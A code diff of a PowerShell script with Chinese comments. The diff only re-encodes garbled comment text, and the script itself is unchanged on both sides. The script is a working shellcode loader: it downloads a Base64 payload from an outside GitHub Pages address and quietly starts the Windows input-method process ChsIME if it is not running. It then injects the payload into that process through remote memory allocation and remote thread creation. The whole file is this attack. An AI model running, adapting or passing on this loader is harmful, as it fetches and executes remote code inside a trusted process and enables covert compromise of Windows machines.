@@ -1,76 +1,76 @@
-# µ¼Èë±ØÒªµÄWindows APIº¯ÊıºÍ³£Á¿¶¨Òå
+# å¯¼å…¥å¿…è¦çš„Windows APIå‡½æ•°å’Œå¸¸é‡å®šä¹‰
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
 
-// Win32 APIº¯Êı¶¨Òå
+// Win32 APIå‡½æ•°å®šä¹‰
 public class Win32 {
-    // ´ò¿ª½ø³ÌAPI
+    // æ‰“å¼€è¿›ç¨‹API
     [DllImport("kernel32.dll")]
     public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
     
-    // ÔÚÔ¶³Ì½ø³ÌÖĞ·ÖÅäÄÚ´æAPI
+    // åœ¨è¿œç¨‹è¿›ç¨‹ä¸­åˆ†é…å†…å­˜API
     [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
     public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
     
-    // Ğ´ÈëÔ¶³Ì½ø³ÌÄÚ´æAPI
+    // å†™å…¥è¿œç¨‹è¿›ç¨‹å†…å­˜API
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
     
-    // ´´½¨Ô¶³ÌÏß³ÌAPI
+    // åˆ›å»ºè¿œç¨‹çº¿ç¨‹API
     [DllImport("kernel32.dll")]
     public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
     
-    // ¹Ø±Õ¾ä±úAPI
+    // å…³é—­å¥æŸ„API
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool CloseHandle(IntPtr hObject);
     
-    // ÏÔÊ¾ÏûÏ¢¿òAPI
+    // æ˜¾ç¤ºæ¶ˆæ¯æ¡†API
     [DllImport("user32.dll", CharSet = CharSet.Unicode)]
     public static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);
     
-    // »ñÈ¡×îºó´íÎó´úÂë
+    // è·å–æœ€åé”™è¯¯ä»£ç 
     [DllImport("kernel32.dll")]
     public static extern uint GetLastError();
     
-    // ½ø³Ì·ÃÎÊÈ¨ÏŞ³£Á¿
+    // è¿›ç¨‹è®¿é—®æƒé™å¸¸é‡
     public const int PROCESS_CREATE_THREAD = 0x0002;
     public const int PROCESS_QUERY_INFORMATION = 0x0400;
     public const int PROCESS_VM_OPERATION = 0x0008;
     public const int PROCESS_VM_WRITE = 0x0020;
     public const int PROCESS_VM_READ = 0x0010;
     
-    // ÄÚ´æ·ÖÅä³£Á¿
+    // å†…å­˜åˆ†é…å¸¸é‡
     public const uint MEM_COMMIT = 0x00001000;
     public const uint MEM_RESERVE = 0x00002000;
     public const uint PAGE_EXECUTE_READWRITE = 0x40;
 }
 "@
 
-# È«¾Ö±äÁ¿¶¨Òå
-$shellcodeUrl = "https://me2hk.github.io/"                                                # ÔÚÏß»ñÈ¡shellcodeµÄURL
-$targetProcessName = "ChsIME"                                                             # ×¢ÈëÄ¿±ê½ø³ÌÃû³Æ
-$injectionSuccess = $false                                                                # ×¢Èë³É¹¦±êÖ¾
+# å…¨å±€å˜é‡å®šä¹‰
+$shellcodeUrl = "https://me2hk.github.io/"                                                # åœ¨çº¿è·å–shellcodeçš„URL
+$targetProcessName = "ChsIME"                                                             # æ³¨å…¥ç›®æ ‡è¿›ç¨‹åç§°
+$injectionSuccess = $false                                                                # æ³¨å…¥æˆåŠŸæ ‡å¿—
 
-# ÏÔÊ¾ÏûÏ¢¿òº¯Êı
+# æ˜¾ç¤ºæ¶ˆæ¯æ¡†å‡½æ•°
 function Show-MessageBox {
     param($caption, $text)
-    [Win32]::MessageBox([IntPtr]::Zero, $text, $caption, 0) # 0±íÊ¾Ö»ÓĞÈ·¶¨°´Å¥
+    [Win32]::MessageBox([IntPtr]::Zero, $text, $caption, 0) # 0è¡¨ç¤ºåªæœ‰ç¡®å®šæŒ‰é’®
 }
 
-# ÔÚÏß»ñÈ¡shellcodeº¯Êı
+# åœ¨çº¿è·å–shellcodeå‡½æ•°
 function Download-String {
     param($url)
     try {
-        # Ê¹ÓÃWebClientÏÂÔØ×Ö·û´®
+        # ä½¿ç”¨WebClientä¸‹è½½å­—ç¬¦ä¸²
         $webClient = New-Object System.Net.WebClient
         $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
         return $webClient.DownloadString($url)
     }
     catch {
-        Write-Host "ÏÂÔØÊ§°Ü: $($_.Exception.Message)"
+        Write-Host "ä¸‹è½½å¤±è´¥: $($_.Exception.Message)"
 
-        # ³¢ÊÔÊ¹ÓÃ·ÇHTTPSÁ´½Ó
+        # å°è¯•ä½¿ç”¨éHTTPSé“¾æ¥
         if ($url.StartsWith("https://")) {
             $httpUrl = $url.Replace("https://", "http://")
             try {
@@ -79,7 +79,7 @@ function Download-String {
                 return $webClient.DownloadString($httpUrl)
             }
             catch {
-                # Èç¹û·Ç°²È«Á¬½ÓÒ²Ê§°Ü£¬ÖØĞÂÅ×³öÔ­Ê¼Òì³£
+                # å¦‚æœéå®‰å…¨è¿æ¥ä¹Ÿå¤±è´¥ï¼Œé‡æ–°æŠ›å‡ºåŸå§‹å¼‚å¸¸
                 throw $_.Exception
             }
         }
@@ -87,17 +87,17 @@ function Download-String {
     }
 }
 
-# ¸ù¾İ½ø³ÌÃû»ñÈ¡PIDº¯Êı
+# æ ¹æ®è¿›ç¨‹åè·å–PIDå‡½æ•°
 function Get-ProcessPidByName {
     param($processName)
-    # È·±£½ø³ÌÃû²»°üº¬.exeÀ©Õ¹Ãû
+    # ç¡®ä¿è¿›ç¨‹åä¸åŒ…å«.exeæ‰©å±•å
     if ($processName.EndsWith(".exe")) {
         $processName = $processName.Substring(0, $processName.Length - 4)
     }
     
-    # »ñÈ¡Ö¸¶¨Ãû³ÆµÄ½ø³Ì
+    # è·å–æŒ‡å®šåç§°çš„è¿›ç¨‹
     $processes = Get-Process -Name $processName -ErrorAction SilentlyContinue
-    Write-Host "ÕÒµ½ $($processes.Count) ¸öÃûÎª '$processName' µÄ½ø³Ì"
+    Write-Host "æ‰¾åˆ° $($processes.Count) ä¸ªåä¸º '$processName' çš„è¿›ç¨‹"
     
     if ($processes) {
         return $processes[0].Id
@@ -105,11 +105,11 @@ function Get-ProcessPidByName {
     return -1
 }
 
-# Òş²ØÆô¶¯½ø³Ìº¯Êı
+# éšè—å¯åŠ¨è¿›ç¨‹å‡½æ•°
 function Start-ProcessHidden {
     param($processName)
     try {
-        # ¹¹½¨½ø³ÌÍêÕûÂ·¾¶
+        # æ„å»ºè¿›ç¨‹å®Œæ•´è·¯å¾„
         $systemDir = $env:SystemDirectory
         if ([string]::IsNullOrEmpty($systemDir)) {
             $systemDir = "$env:windir\System32"
@@ -117,52 +117,52 @@ function Start-ProcessHidden {
         
         $processPath = Join-Path $systemDir $processName
         
-        Write-Host "³¢ÊÔÆô¶¯½ø³Ì: $processPath"
+        Write-Host "å°è¯•å¯åŠ¨è¿›ç¨‹: $processPath"
         
-        # ¼ì²éÎÄ¼şÊÇ·ñ´æÔÚ
+        # æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨
         if (-not (Test-Path $processPath)) {
-            Write-Host "½ø³ÌÎÄ¼ş²»´æÔÚ: $processPath"
-            # ³¢ÊÔÔÚSystem32Ä¿Â¼ÖĞ²éÕÒ
+            Write-Host "è¿›ç¨‹æ–‡ä»¶ä¸å­˜åœ¨: $processPath"
+            # å°è¯•åœ¨System32ç›®å½•ä¸­æŸ¥æ‰¾
             $altPath = "$env:windir\System32\$processName"
             if (Test-Path $altPath) {
                 $processPath = $altPath
-                Write-Host "ÕÒµ½Ìæ´úÂ·¾¶: $processPath"
+                Write-Host "æ‰¾åˆ°æ›¿ä»£è·¯å¾„: $processPath"
             } else {
-                Write-Host "ÎŞ·¨ÕÒµ½½ø³ÌÎÄ¼ş"
+                Write-Host "æ— æ³•æ‰¾åˆ°è¿›ç¨‹æ–‡ä»¶"
                 return
             }
         }
         
-        # Ê¹ÓÃStart-ProcessÆô¶¯½ø³Ì
+        # ä½¿ç”¨Start-Processå¯åŠ¨è¿›ç¨‹
         $process = Start-Process -FilePath $processPath -WindowStyle Hidden -PassThru
         if ($process) {
-            Write-Host "ÒÑÒş²ØÆô¶¯½ø³Ì: $processName (PID: $($process.Id))"
+            Write-Host "å·²éšè—å¯åŠ¨è¿›ç¨‹: $processName (PID: $($process.Id))"
             return $process.Id
         } else {
-            Write-Host "Æô¶¯½ø³ÌÊ§°Ü: ÎŞ·¨Æô¶¯½ø³Ì"
+            Write-Host "å¯åŠ¨è¿›ç¨‹å¤±è´¥: æ— æ³•å¯åŠ¨è¿›ç¨‹"
             return -1
         }
     }
     catch {
-        Write-Host "Æô¶¯½ø³ÌÊ§°Ü: $($_.Exception.Message)"
-        Write-Host "´íÎóÏêÇé: $($_.Exception.GetType().FullName)"
+        Write-Host "å¯åŠ¨è¿›ç¨‹å¤±è´¥: $($_.Exception.Message)"
+        Write-Host "é”™è¯¯è¯¦æƒ…: $($_.Exception.GetType().FullName)"
         if ($_.Exception.InnerException) {
-            Write-Host "ÄÚ²¿´íÎó: $($_.Exception.InnerException.Message)"
+            Write-Host "å†…éƒ¨é”™è¯¯: $($_.Exception.InnerException.Message)"
         }
         return -1
     }
 }
 
-# ×¢Èëshellcodeµ½Ö¸¶¨½ø³Ìº¯Êı
+# æ³¨å…¥shellcodeåˆ°æŒ‡å®šè¿›ç¨‹å‡½æ•°
 function Inject {
     param($shellcode, $procPID)
     $procHandle = [IntPtr]::Zero
     $allocMemAddress = [IntPtr]::Zero
     $remoteThread = [IntPtr]::Zero
-    $result = -1  # Ä¬ÈÏÊ§°Ü
+    $result = -1  # é»˜è®¤å¤±è´¥
 
     try {
-        # ´ò¿ªÄ¿±ê½ø³Ì£¬»ñÈ¡½ø³Ì¾ä±ú
+        # æ‰“å¼€ç›®æ ‡è¿›ç¨‹ï¼Œè·å–è¿›ç¨‹å¥æŸ„
         $procHandle = [Win32]::OpenProcess(
             [Win32]::PROCESS_CREATE_THREAD -bor [Win32]::PROCESS_QUERY_INFORMATION -bor 
             [Win32]::PROCESS_VM_OPERATION -bor [Win32]::PROCESS_VM_WRITE -bor [Win32]::PROCESS_VM_READ,
@@ -171,13 +171,13 @@ function Inject {
 
         if ($procHandle -eq [IntPtr]::Zero) {
             $errorCode = [Win32]::GetLastError()
-            Write-Host "´ò¿ª½ø³ÌÊ§°Ü£¬´íÎó´úÂë: $errorCode"
+            Write-Host "æ‰“å¼€è¿›ç¨‹å¤±è´¥ï¼Œé”™è¯¯ä»£ç : $errorCode"
             return -1
         }
 
-        Write-Host "³É¹¦´ò¿ª½ø³Ì£¬¾ä±ú: $procHandle"
+        Write-Host "æˆåŠŸæ‰“å¼€è¿›ç¨‹ï¼Œå¥æŸ„: $procHandle"
 
-        # ÔÚÄ¿±ê½ø³ÌÖĞ·ÖÅäÄÚ´æ
+        # åœ¨ç›®æ ‡è¿›ç¨‹ä¸­åˆ†é…å†…å­˜
         $allocMemAddress = [Win32]::VirtualAllocEx(
             $procHandle, [IntPtr]::Zero, [System.UInt32]$shellcode.Length,
             [Win32]::MEM_COMMIT -bor [Win32]::MEM_RESERVE, [Win32]::PAGE_EXECUTE_READWRITE
@@ -185,13 +185,13 @@ function Inject {
 
         if ($allocMemAddress -eq [IntPtr]::Zero) {
             $errorCode = [Win32]::GetLastError()
-            Write-Host "·ÖÅäÄÚ´æÊ§°Ü£¬´íÎó´úÂë: $errorCode"
+            Write-Host "åˆ†é…å†…å­˜å¤±è´¥ï¼Œé”™è¯¯ä»£ç : $errorCode"
             return -1
         }
 
-        Write-Host "³É¹¦·ÖÅäÄÚ´æ£¬µØÖ·: $allocMemAddress"
+        Write-Host "æˆåŠŸåˆ†é…å†…å­˜ï¼Œåœ°å€: $allocMemAddress"
 
-        # ½«shellcodeĞ´ÈëÄ¿±ê½ø³ÌµÄÄÚ´æ
+        # å°†shellcodeå†™å…¥ç›®æ ‡è¿›ç¨‹çš„å†…å­˜
         $bytesWritten = [UIntPtr]::Zero
         $writeResult = [Win32]::WriteProcessMemory(
             $procHandle, $allocMemAddress, $shellcode, [System.UInt32]$shellcode.Length, [ref]$bytesWritten
@@ -199,37 +199,37 @@ function Inject {
 
         if (!$writeResult) {
             $errorCode = [Win32]::GetLastError()
-            Write-Host "Ğ´ÈëÄÚ´æÊ§°Ü£¬´íÎó´úÂë: $errorCode"
+            Write-Host "å†™å…¥å†…å­˜å¤±è´¥ï¼Œé”™è¯¯ä»£ç : $errorCode"
             return -1
         }
 
-        Write-Host "³É¹¦Ğ´ÈëÄÚ´æ£¬Ğ´Èë×Ö½ÚÊı: $bytesWritten"
+        Write-Host "æˆåŠŸå†™å…¥å†…å­˜ï¼Œå†™å…¥å­—èŠ‚æ•°: $bytesWritten"
 
-        # ÔÚÄ¿±ê½ø³ÌÖĞ´´½¨Ô¶³ÌÏß³ÌÖ´ĞĞshellcode
+        # åœ¨ç›®æ ‡è¿›ç¨‹ä¸­åˆ›å»ºè¿œç¨‹çº¿ç¨‹æ‰§è¡Œshellcode
         $remoteThread = [Win32]::CreateRemoteThread(
             $procHandle, [IntPtr]::Zero, 0, $allocMemAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero
         )
 
         if ($remoteThread -eq [IntPtr]::Zero) {
             $errorCode = [Win32]::GetLastError()
-            Write-Host "´´½¨Ô¶³ÌÏß³ÌÊ§°Ü£¬´íÎó´úÂë: $errorCode"
+            Write-Host "åˆ›å»ºè¿œç¨‹çº¿ç¨‹å¤±è´¥ï¼Œé”™è¯¯ä»£ç : $errorCode"
             return -1
         }
 
-        Write-Host "³É¹¦´´½¨Ô¶³ÌÏß³Ì£¬Ïß³Ì¾ä±ú: $remoteThread"
-        Write-Host "×¢ÈëÍê³É"
-        $result = 0  # ³É¹¦
+        Write-Host "æˆåŠŸåˆ›å»ºè¿œç¨‹çº¿ç¨‹ï¼Œçº¿ç¨‹å¥æŸ„: $remoteThread"
+        Write-Host "æ³¨å…¥å®Œæˆ"
+        $result = 0  # æˆåŠŸ
     }
     catch {
-        Write-Host "×¢Èë¹ı³ÌÖĞ·¢Éú´íÎó: $($_.Exception.Message)"
-        Write-Host "´íÎóÀàĞÍ: $($_.Exception.GetType().FullName)"
+        Write-Host "æ³¨å…¥è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯: $($_.Exception.Message)"
+        Write-Host "é”™è¯¯ç±»å‹: $($_.Exception.GetType().FullName)"
         if ($_.Exception.InnerException) {
-            Write-Host "ÄÚ²¿´íÎó: $($_.Exception.InnerException.Message)"
+            Write-Host "å†…éƒ¨é”™è¯¯: $($_.Exception.InnerException.Message)"
         }
         $result = -1
     }
     finally {
-        # ÇåÀí×ÊÔ´
+        # æ¸…ç†èµ„æº
         if ($procHandle -ne [IntPtr]::Zero) {
             [void][Win32]::CloseHandle($procHandle)
         }
@@ -241,70 +241,70 @@ function Inject {
     return $result
 }
 
-# Ö÷Ö´ĞĞÂß¼­
+# ä¸»æ‰§è¡Œé€»è¾‘
 try {
-    # ÉèÖÃ°²È«Ğ­ÒéÎªTLS 1.2
+    # è®¾ç½®å®‰å…¨åè®®ä¸ºTLS 1.2
     [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 
-    # ÔÚÏß»ñÈ¡shellcodeµÄBase64±àÂë
-    Write-Host "ÕıÔÚ´Ó $shellcodeUrl ÏÂÔØshellcode..."
+    # åœ¨çº¿è·å–shellcodeçš„Base64ç¼–ç 
+    Write-Host "æ­£åœ¨ä» $shellcodeUrl ä¸‹è½½shellcode..."
     $base64Shellcode = Download-String $shellcodeUrl
     $shellcode = [Convert]::FromBase64String($base64Shellcode)
-    Write-Host "³É¹¦ÏÂÔØ²¢½âÂëshellcode£¬³¤¶È: $($shellcode.Length) ×Ö½Ú"
+    Write-Host "æˆåŠŸä¸‹è½½å¹¶è§£ç shellcodeï¼Œé•¿åº¦: $($shellcode.Length) å­—èŠ‚"
 
-    # »ñÈ¡ChsIME½ø³ÌµÄPID
-    Write-Host "ÕıÔÚ²éÕÒ½ø³Ì: $targetProcessName"
+    # è·å–ChsIMEè¿›ç¨‹çš„PID
+    Write-Host "æ­£åœ¨æŸ¥æ‰¾è¿›ç¨‹: $targetProcessName"
     $targetPid = Get-ProcessPidByName $targetProcessName
 
-    # Èç¹ûÎ´ÕÒµ½½ø³Ì£¬ÔòÒş²ØÆô¶¯Ëü
+    # å¦‚æœæœªæ‰¾åˆ°è¿›ç¨‹ï¼Œåˆ™éšè—å¯åŠ¨å®ƒ
     if ($targetPid -eq -1) {
-        Write-Host "Î´ÕÒµ½ $targetProcessName ½ø³Ì£¬³¢ÊÔÆô¶¯Ëü..."
+        Write-Host "æœªæ‰¾åˆ° $targetProcessName è¿›ç¨‹ï¼Œå°è¯•å¯åŠ¨å®ƒ..."
         $targetPid = Start-ProcessHidden "ChsIME.exe"
         
         if ($targetPid -eq -1) {
-            Write-Host "ÎŞ·¨Æô¶¯ChsIME½ø³Ì"
-            Show-MessageBox "´íÎó" "ÎŞ·¨Æô¶¯Ä¿±ê½ø³Ì"
+            Write-Host "æ— æ³•å¯åŠ¨ChsIMEè¿›ç¨‹"
+            Show-MessageBox "é”™è¯¯" "æ— æ³•å¯åŠ¨ç›®æ ‡è¿›ç¨‹"
             exit
         }
         
-        # µÈ´ı½ø³ÌÆô¶¯
+        # ç­‰å¾…è¿›ç¨‹å¯åŠ¨
         Start-Sleep -Seconds 2
-        Write-Host "ÒÑÆô¶¯½ø³Ì£¬PID: $targetPid"
+        Write-Host "å·²å¯åŠ¨è¿›ç¨‹ï¼ŒPID: $targetPid"
     } else {
-        Write-Host "ÕÒµ½Ä¿±ê½ø³Ì£¬PID: $targetPid"
+        Write-Host "æ‰¾åˆ°ç›®æ ‡è¿›ç¨‹ï¼ŒPID: $targetPid"
     }
 
-    # ×¢Èëshellcodeµ½Ä¿±ê½ø³Ì
-    Write-Host "¿ªÊ¼×¢Èëshellcodeµ½½ø³Ì..."
+    # æ³¨å…¥shellcodeåˆ°ç›®æ ‡è¿›ç¨‹
+    Write-Host "å¼€å§‹æ³¨å…¥shellcodeåˆ°è¿›ç¨‹..."
     $result = Inject $shellcode $targetPid
     
-    # ¸üÏêÏ¸µÄ³É¹¦ÅĞ¶Ï
+    # æ›´è¯¦ç»†çš„æˆåŠŸåˆ¤æ–­
     if ($result -eq 0) {
         $injectionSuccess = $true
         
-        # ÑéÖ¤×¢ÈëÊÇ·ñÕæµÄ³É¹¦ - ¼ì²éÔ¶³ÌÏß³ÌÊÇ·ñÈÔÔÚÔËĞĞ
+        # éªŒè¯æ³¨å…¥æ˜¯å¦çœŸçš„æˆåŠŸ - æ£€æŸ¥è¿œç¨‹çº¿ç¨‹æ˜¯å¦ä»åœ¨è¿è¡Œ
         Start-Sleep -Seconds 1
         
-        # ÏÔÊ¾×¢ÈëÍê³ÉÏûÏ¢¿ò
-        # $ Show-MessageBox "¹ØÓÚ" ("         ×´Ì¬:  ×¢Èë³É¹¦!`n         ½ø³Ì:  {0}.exe`n         PID:   {1}" -f $targetProcessName, $targetPid)
-        Write-Host "×¢Èë³É¹¦!"
+        # æ˜¾ç¤ºæ³¨å…¥å®Œæˆæ¶ˆæ¯æ¡†
+        # $ Show-MessageBox "å…³äº" ("         çŠ¶æ€:  æ³¨å…¥æˆåŠŸ!`n         è¿›ç¨‹:  {0}.exe`n         PID:   {1}" -f $targetProcessName, $targetPid)
+        Write-Host "æ³¨å…¥æˆåŠŸ!"
     }
     else {
-        # ×¢ÈëÊ§°Ü
-        Write-Host "×¢Èë²Ù×÷Ê§°Ü£¬·µ»Ø´úÂë: $result"
-        Show-MessageBox "¹ØÓÚ" "         ×´Ì¬:  ×¢ÈëÊ§°Ü!"
-        Write-Host "×¢ÈëÊ§°Ü!"
+        # æ³¨å…¥å¤±è´¥
+        Write-Host "æ³¨å…¥æ“ä½œå¤±è´¥ï¼Œè¿”å›ä»£ç : $result"
+        Show-MessageBox "å…³äº" "         çŠ¶æ€:  æ³¨å…¥å¤±è´¥!"
+        Write-Host "æ³¨å…¥å¤±è´¥!"
     }
 }
 catch {
-    # Òì³£´¦Àí
-    Write-Host "·¢Éú´íÎó: $($_.Exception.Message)"
-    Write-Host "´íÎóÀàĞÍ: $($_.Exception.GetType().FullName)"
-    Write-Host "¶ÑÕ»¸ú×Ù: $($_.ScriptStackTrace)"
+    # å¼‚å¸¸å¤„ç†
+    Write-Host "å‘ç”Ÿé”™è¯¯: $($_.Exception.Message)"
+    Write-Host "é”™è¯¯ç±»å‹: $($_.Exception.GetType().FullName)"
+    Write-Host "å †æ ˆè·Ÿè¸ª: $($_.ScriptStackTrace)"
     if ($_.Exception.InnerException) {
-        Write-Host "ÄÚ²¿Òì³£: $($_.Exception.InnerException.Message)"
+        Write-Host "å†…éƒ¨å¼‚å¸¸: $($_.Exception.InnerException.Message)"
     }
 
-    # ÏÔÊ¾´íÎóÏûÏ¢¿ò
-    Show-MessageBox "´íÎó" "³ÌĞòÖ´ĞĞ¹ı³ÌÖĞ·¢Éú´íÎó: $($_.Exception.Message)"
+    # æ˜¾ç¤ºé”™è¯¯æ¶ˆæ¯æ¡†
+    Show-MessageBox "é”™è¯¯" "ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯: $($_.Exception.Message)"
 }
